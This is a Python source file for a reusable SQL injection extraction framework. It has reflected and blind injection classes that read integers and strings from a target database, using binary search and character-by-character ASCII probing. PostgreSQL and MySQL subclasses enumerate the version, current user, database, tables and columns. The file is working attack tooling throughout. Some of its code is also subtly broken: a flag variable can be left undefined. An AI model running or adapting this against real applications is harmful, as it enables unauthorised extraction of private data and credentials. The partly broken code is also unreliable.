from abc import ABC, abstractmethod
import sys
import string

class SQLi(ABC):

    @staticmethod
    def build_query(column: str, table=None, condition=None, offset=None):
        condition = "" if not condition else f" WHERE {condition}"
        offset = "" if offset is None else f" OFFSET {offset}"
        table = "" if not table else f" FROM {table}"
        return f"SELECT {column}{table}{condition} LIMIT 1{offset}"

    def extract_multiple_ints(self, column: str, table=None, condition=None, verbose=False):
        row_count = self.extract_int(f"COUNT({column})", table=table, condition=condition, verbose=verbose)
        if verbose:
            print(f"Fetching {row_count} rows")

        rows = []
        for i in range(0, row_count):
            rows.append(self.extract_int(column, table, condition, i, verbose=verbose))

        return rows

    def extract_multiple_strings(self, column: str, table=None, condition=None, verbose=False):
        row_count = self.extract_int(f"COUNT({column})", table=table, condition=condition, verbose=verbose)
        if verbose:
            print(f"Fetching {row_count} rows")

        rows = []
        for i in range(0, row_count):
            rows.append(self.extract_string(column, table, condition, i, verbose=verbose))

        return rows

    @abstractmethod
    def extract_int(self, column: str, table=None, condition=None, 
                    offset=None, verbose=False):
        pass

    @abstractmethod
    def extract_string(self, column: str, table=None, condition=None, offset=None, verbose=False):
        pass

    @abstractmethod
    def get_database_version(self, verbose=False):
        pass

    @abstractmethod
    def get_current_user(self, verbose=False):
        pass

    @abstractmethod
    def get_current_database(self, verbose=False):
        pass

    @abstractmethod
    def get_table_names(self, schema: str, verbose=False):
        pass

    @abstractmethod
    def get_column_names(self, table: str, schema: str, verbose=False):
        pass

class ReflectedSQLi(SQLi, ABC):

    def __init__(self, column_types: list):
        self.column_types = column_types

    @abstractmethod
    def reflected_sqli(self, columns: list, table=None, condition=None, offset=None, verbose=False):
        pass

    def extract_int(self, column: str, table=None, condition=None, offset=None, verbose=False):
        query_columns = [column] + list(map(str, range(2, len(self.column_types) + 1)))
        return int(self.reflected_sqli(query_columns, table, condition, offset)[0])

    def extract_string(self, column: str, table=None, condition=None, offset=None, verbose=False):
        if str not in self.column_types:
            print("[!] Reflectd SQL does not reflect string types, only:", self.column_types)
            return None

        str_column = self.column_types.index(str)
        query_columns = list(map(lambda c: f"'{c}'", range(len(self.column_types))))
        query_columns[str_column] = column
        return self.reflected_sqli(query_columns, table, condition, offset)[str_column]

    def extract_multiple_ints(self, columns: list|str, table=None, condition=None, verbose=False):
        if isinstance(columns, str):
            columns = [columns]
            one = True

        column_count = len(columns)
        if len(self.column_types) < column_count:
            print(f"[!] Reflectd SQL does not reflect required amount of columns. required={column_count}, got={len(self.column_types)}")
            return None

        query_columns = columns + list(map(str, range(column_count + 1, len(self.column_types) + 1)))
        row_count = self.extract_int(f"COUNT(*)", table=table, condition=condition, verbose=verbose)
        if verbose:
            print(f"Fetching {row_count} rows")

        rows = []
        column_str = ",".join(query_columns)
        for i in range(0, row_count):
            row = self.reflected_sqli(query_columns, table, condition, i, verbose=verbose)
            if one:
                rows.append(int(row[0]))
            else:
                rows.append(list(map(lambda i: int(row[i]), range(column_count))))

        return rows

    def extract_multiple_strings(self, columns: list|str, table=None, condition=None, verbose=False):
        if isinstance(columns, str):
            columns = [columns]
            one = True

        column_count = len(columns)
        if self.column_types.count(str) < column_count:
            print(f"[!] Reflectd SQL does not reflect required amount of string columns. required={column_count}, got={self.column_types.count(str)}")
            return None

        query_columns = list(map(str, range(1, len(self.column_types) + 1)))
        offsets = list(None for _ in range(column_count))
        offset = 0
        for i, column in enumerate(columns):
            while self.column_types[offset] != str:
                offset += 1
            offsets[i] = offset
            query_columns[offset] = column
            offset += 1

        row_count = self.extract_int(f"COUNT(*)", table=table, condition=condition, verbose=verbose)
        if verbose:
            print(f"Fetching {row_count} rows")

        rows = []
        column_str = ",".join(query_columns)
        for i in range(0, row_count):
            row = self.reflected_sqli(query_columns, table, condition, i, verbose=verbose)
            if one:
                rows.append(row[offsets[0]])
            else:
                rows.append(list(map(lambda o: row[o], offsets)))

        return rows

    # todo: extract_multiple with columns as dict (name -> type), e.g. extract_multiple({"id": int, "name": str})

class BlindSQLi(SQLi, ABC):

    @abstractmethod
    def blind_sqli(self, condition: str, verbose=False) -> bool:
        pass

    def extract_int(self, column: str, table=None, condition=None, 
                    offset=None, verbose=False, binary_search=True,
                    min_value=None, max_value=None):

        query = self.build_query(column, table, condition, offset)

        if self.blind_sqli(f"({query})=0"):
            return 0

        if not binary_search:
            cur_int = 1 if min_value is None else min_value
            while self.blind_sqli(f"({query})>{cur_int}", verbose):
                cur_int += 1
                if max_value is not None and cur_int >= max_value:
                    return None

            return cur_int
        else:
            if min_value is None or max_value is None:
                min_value = 1 if min_value is None else min_value
                max_value = 1 if max_value is None else max_value

                while self.blind_sqli(f"({query})>{max_value}", verbose):
                    min_value = max_value + 1
                    max_value = max_value * 2

            while True:
                cur_int = (min_value + max_value) // 2
                if self.blind_sqli(f"({query})>{cur_int}", verbose):
                    min_value = cur_int + 1
                elif self.blind_sqli(f"({query})<{cur_int}", verbose):
                    max_value = cur_int - 1
                else:
                    return cur_int

    def extract_string(self, column: str, table=None, condition=None, offset=None, verbose=False, max_length=None, charset=string.printable):

        if max_length is None:
            max_length = self.extract_int(f"LENGTH({column})", table, condition, offset, verbose=verbose)
            if verbose:
                print("Fetched length:", max_length)

        cur_str = ""
        while True:
            found = False
            cur_column = f"ascii(substr({column},{len(cur_str) + 1},1))"
            if charset:
                query = self.build_query(cur_column, table, condition, offset)
                for c in charset:
                    if self.blind_sqli(f"({query})={ord(c)}"):
                        found = True
                        cur_str += c
                        if verbose:
                            sys.stdout.write(c)
                            sys.stdout.flush()
                        break
            else:
                c = self.extract_int(cur_column, table, condition, min_value=0, max_value=127)
                if c is not None:
                    found = True
                    cur_str += chr(c)
                    if verbose:
                        sys.stdout.write(chr(c))
                        sys.stdout.flush()  
            
            if not found or (max_length is not None and len(cur_str) >= max_length):
                break

        if verbose:
            print()

        return cur_str


class PostgreSQLi(SQLi, ABC):
    def get_database_version(self, verbose=False):
        return self.extract_string("VERSION()", verbose=verbose)

    def get_current_user(self, verbose=False):
        return self.extract_string("current_user", verbose=verbose)

    def get_current_database(self, verbose=False):
        return self.extract_string("current_database()", verbose=verbose)

    def get_table_names(self, schema: str = "public", verbose=False):
        return self.extract_multiple_strings("table_name", "information_schema.tables", f"table_schema='{schema}'",
                                             verbose=verbose)

    def get_column_names(self, table: str, schema: str = "public", verbose=False):
        return self.extract_multiple_strings("column_name", "information_schema.columns",
                                             f"table_schema='{schema}' AND table_name='{table}'",
                                             verbose=verbose)


class MySQLi(SQLi, ABC):
    def get_database_version(self, verbose=False):
        return self.extract_string("VERSION()", verbose=verbose)

    def get_current_user(self, verbose=False):
        return self.extract_string("USER()", verbose=verbose)

    def get_current_database(self, verbose=False):
        return self.extract_string("DATABASE()", verbose=verbose)

    def get_table_names(self, schema: str, verbose=False):
        return self.extract_multiple_strings("table_name", "information_schema.tables", f"table_schema='{schema}'",
                                             verbose=verbose)

    def get_column_names(self, table: str, schema: str, verbose=False):
        return self.extract_multiple_strings("column_name", "information_schema.columns",
                                             f"table_schema='{schema}' AND table_name='{table}'",
                                             verbose=verbose)
